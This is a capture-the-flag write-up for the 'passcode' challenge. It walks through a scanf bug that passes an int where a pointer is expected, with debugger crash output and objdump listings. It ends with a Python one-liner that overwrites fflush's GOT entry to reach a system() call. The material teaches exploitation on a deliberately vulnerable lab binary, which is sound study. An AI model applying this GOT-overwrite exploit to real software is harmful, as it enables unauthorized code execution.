# passcode

## Code
In this challenge, we are given:

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

## Gather Information
If you try to recompile the program, you will get the following warnings:
```
passcode.c: In function ‘login’:
passcode.c:9:9: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat]
passcode.c:14:9: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat]
```

If you try to type the integers `338150` and `13371337`, you will receive a segmentation fault.

This is because of these lines:
```
        scanf("%d", passcode1);
        ...
        ...
        scanf("%d", passcode2);
```
The correct way to use `scanf` is `scanf("%d", &passcode)` with the '**&**' by referring it to a pointer. However, this program is written to read the input arguments as an actual memory location, i.e. you can ask `scanf` to manipulate a location of your choice!

Let's examine the program using `gdb` with `peda`:

```
pattern create 100
enter your name: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
enter passcode1: 0
```

We encounter a segmentation fault:
```assembly
[----------------------------------registers-----------------------------------]
EAX: 0x4c414136 ('6AAL')
EBX: 0xb7fc6ff4 --> 0x1a6d7c 
ECX: 0x0 
EDX: 0x1 
ESI: 0xb7fc7ac0 --> 0xfbad2288 
EDI: 0x0 
EBP: 0xbffff298 --> 0xb7e1f900 (0xb7e1f900)
ESP: 0xbfffef50 --> 0xbfffef60 --> 0xb7fc0031 --> 0x5c000000 ('')
EIP: 0xb7e6fda3 (<_IO_vfscanf+11667>:	mov    DWORD PTR [eax],edx)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb7e6fd94 <_IO_vfscanf+11652>:	mov    eax,DWORD PTR [ebp-0x1d8]
   0xb7e6fd9a <_IO_vfscanf+11658>:	add    DWORD PTR [ebp-0x1d8],0x4
   0xb7e6fda1 <_IO_vfscanf+11665>:	mov    eax,DWORD PTR [eax]
=> 0xb7e6fda3 <_IO_vfscanf+11667>:	mov    DWORD PTR [eax],edx
   0xb7e6fda5 <_IO_vfscanf+11669>:	jmp    0xb7e6ea4e <_IO_vfscanf+6718>
   0xb7e6fdaa <_IO_vfscanf+11674>:	cmp    DWORD PTR [ebp-0x18c],0x2d
   0xb7e6fdb1 <_IO_vfscanf+11681>:	jne    0xb7e6e3cd <_IO_vfscanf+5053>
   0xb7e6fdb7 <_IO_vfscanf+11687>:	jmp    0xb7e6f7ec <_IO_vfscanf+10204>
[------------------------------------stack-------------------------------------]
0000| 0xbfffef50 --> 0xbfffef60 --> 0xb7fc0031 --> 0x5c000000 ('')
0004| 0xbfffef54 --> 0xbffff27c --> 0xbfffef61 --> 0xb7fc00 
0008| 0xbfffef58 --> 0xa ('\n')
0012| 0xbfffef5c --> 0x0 
0016| 0xbfffef60 --> 0xb7fc0031 --> 0x5c000000 ('')
0020| 0xbfffef64 --> 0xb7fda000 ("enter passcode1 : AA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL!\n")
0024| 0xbfffef68 --> 0xb7e1f900 (0xb7e1f900)
0028| 0xbfffef6c --> 0xb7e90ab4 (mov    ebp,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xb7e6fda3 in _IO_vfscanf () from /lib/i386-linux-gnu/libc.so.6
```
Notice here that the last 4 characters, `6AAL` is `eax` and `1` is `edx`. This implies we can control the input register values.

Execute `objdump -d passcode`:
```assembly
08048430 <fflush@plt>:
 8048430:	ff 25 04 a0 04 08    	jmp    *0x804a004
 8048436:	68 08 00 00 00       	push   $0x8
 804843b:	e9 d0 ff ff ff       	jmp    8048410 <_init+0x30>
 ...
 ...
 
08048564 <login>:
...
 80485e3:	c7 04 24 af 87 04 08 	movl   $0x80487af,(%esp)
 80485ea:	e8 71 fe ff ff       	call   8048460 <system@plt>
```

The idea here is this, we know the value of `eax` can be control, so we can overwrite `passcode1` to be filled with `fflush` GOT address of `0x804a004`. Now, instead of jumping to `0x804a004`, we are going to invoke `0x80485e3` which is `134514147` in decimal (the system call that executes the bash shell to print the flag).

Hence the solution is:
```
python -c "print 'A'*96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
```

